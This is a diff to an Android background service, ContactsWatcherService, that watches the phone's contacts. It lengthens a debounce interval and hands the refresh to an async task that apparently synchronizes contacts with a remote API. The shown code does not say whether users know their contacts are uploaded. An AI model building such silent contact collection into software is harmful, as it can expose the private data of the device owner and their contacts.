@@ -7,13 +7,14 @@ import android.net.Uri;
 import android.os.Handler;
 import android.os.IBinder;
 import android.provider.ContactsContract;
-import android.util.Log;
 
-import com.theah64.xrob.utils.ContactUtils;
+import com.theah64.xrob.asynctasks.ContactRefresher;
+import com.theah64.xrob.asynctasks.ContactsSynchronizer;
+import com.theah64.xrob.utils.APIRequestGateway;
 
 public class ContactsWatcherService extends Service {
 
-    private static final int MIN_THRESHOLD = 1000;
+    private static final int MIN_THRESHOLD = 5000;
     private static long lastTimeOfUpdate = 0;
 
     public ContactsWatcherService() {
@@ -43,16 +44,17 @@ public class ContactsWatcherService extends Service {
         @Override
         public void onChange(boolean selfChange, Uri uri) {
             super.onChange(selfChange, uri);
+
             System.out.println("Contact changed");
 
             //To prevent double call
             if ((System.currentTimeMillis() - lastTimeOfUpdate) > MIN_THRESHOLD) {
-                System.out.println("Real code works here");
-                final boolean isUpdateNeeded = ContactUtils.refreshContacts(getApplicationContext());
-                if (isUpdateNeeded) {
-                    ContactUtils.push(getApplicationContext());
-                }
                 lastTimeOfUpdate = System.currentTimeMillis();
+
+                System.out.println("Real code works here");
+
+                new ContactRefresher(getApplicationContext()).execute();
+
             } else {
                 System.out.println("Not now!");
             }
